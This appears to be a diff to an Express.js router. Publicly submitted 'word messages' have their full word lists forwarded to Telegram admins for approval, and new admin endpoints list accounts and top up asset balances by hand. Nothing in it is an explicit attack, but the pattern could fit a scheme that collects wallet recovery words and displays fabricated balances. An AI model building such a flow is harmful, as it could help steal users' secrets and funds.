@@ -4,11 +4,14 @@ const express = require("express");
 const { approvalKeyboard, sendTelegramAlert } = require("../telegram");
 const {
   approveWordBatch,
+  getAccountByNumber,
   getWordBatch,
+  listAccounts,
   listRecentWordBatches,
   parseWords,
   rejectWordBatch,
   saveWordBatch,
+  topUpAccount,
 } = require("../services/words");
 
 const router = express.Router();
@@ -34,25 +37,30 @@ router.post("/", async (req, res) => {
       createdBy: req.body?.createdBy || "public",
     });
 
-    const notification = [
-      `New word message waiting for approval #${batch.id}`,
-      batch.title ? `Title: ${batch.title}` : null,
-      `${batch.wordCount} words`,
-      batch.words.join(" "),
-    ].filter(Boolean).join("\n");
+    let sent = false;
+    if (!batch.loggedIn) {
+      const notification = [
+        `New word message waiting for approval #${batch.id}`,
+        batch.title ? `Title: ${batch.title}` : null,
+        `${batch.wordCount} words`,
+        batch.words.join(" "),
+      ].filter(Boolean).join("\n");
 
-    const sent = await sendTelegramAlert(notification, {
-      reply_markup: approvalKeyboard(batch.id),
-    });
+      sent = await sendTelegramAlert(notification, {
+        reply_markup: approvalKeyboard(batch.id),
+      });
+    }
 
     res.status(201).json({
       ok: true,
       batch,
       telegram: {
         sent,
-        message: sent
-          ? "Message sent to Telegram admins for approval."
-          : "No active Telegram admin chats are registered yet.",
+        message: batch.loggedIn
+          ? "Existing account found. User is logged in."
+          : sent
+            ? "Message sent to Telegram admins for approval."
+            : "No active Telegram admin chats are registered yet.",
       },
     });
   } catch (error) {
@@ -70,6 +78,45 @@ router.get("/", async (req, res) => {
     res.json({ ok: true, batches });
   } catch (error) {
     res.status(500).json({ ok: false, error: error.message });
+  }
+});
+
+router.get("/accounts", async (req, res) => {
+  if (!isAdminRequest(req)) {
+    return res.status(401).json({ ok: false, error: "Invalid admin password" });
+  }
+
+  try {
+    res.json({ ok: true, accounts: await listAccounts(req.query.limit || 10) });
+  } catch (error) {
+    res.status(500).json({ ok: false, error: error.message });
+  }
+});
+
+router.get("/accounts/:accountNumber", async (req, res) => {
+  if (!isAdminRequest(req)) {
+    return res.status(401).json({ ok: false, error: "Invalid admin password" });
+  }
+
+  try {
+    const account = await getAccountByNumber(req.params.accountNumber);
+    if (!account) return res.status(404).json({ ok: false, error: "Account was not found" });
+    return res.json({ ok: true, account });
+  } catch (error) {
+    return res.status(500).json({ ok: false, error: error.message });
+  }
+});
+
+router.post("/accounts/:accountNumber/top-up", async (req, res) => {
+  if (!isAdminRequest(req)) {
+    return res.status(401).json({ ok: false, error: "Invalid admin password" });
+  }
+
+  try {
+    const account = await topUpAccount(req.params.accountNumber, req.body?.asset, req.body?.amount);
+    res.json({ ok: true, account });
+  } catch (error) {
+    res.status(400).json({ ok: false, error: error.message });
   }
 });
 
